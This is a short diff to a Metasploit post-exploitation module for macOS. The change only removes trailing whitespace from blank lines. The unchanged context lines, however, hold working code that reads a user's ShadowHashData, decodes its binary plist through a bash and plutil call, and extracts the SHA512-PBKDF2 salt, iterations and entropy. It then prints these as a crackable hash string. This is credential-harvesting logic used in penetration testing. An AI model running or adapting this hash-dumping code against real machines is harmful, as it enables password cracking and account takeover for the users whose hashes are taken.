@@ -57,19 +57,19 @@ class Metasploit3 < Msf::Post
         # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
         # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
         plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
-        
+
         # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
         shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\" | plutil -convert xml1 - -o -'")
-        
+
         # read the plaintext xml
         shadow_xml = REXML::Document.new(shadow_plist)
-        
+
         # parse out the different parts of sha512pbkdf2
         dict = shadow_xml.elements[1].elements[1].elements[2]
         entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\s+/, '').unpack('m*')[0], '')
         iterations = dict.elements[4].text.gsub(/\s+/, '')
         salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
-        
+
         # PBKDF2 stored in <user, iterations, salt, entropy> format
         decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
         print_good "SHA512:#{decoded_hash}"
@@ -164,7 +164,7 @@ class Metasploit3 < Msf::Post
   def lte_tiger?
     ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
   end
-  
+
   # parse the dslocal plist in lion
   def read_ds_xml_plist(plist_content)
     doc  = REXML::Document.new(plist_content)
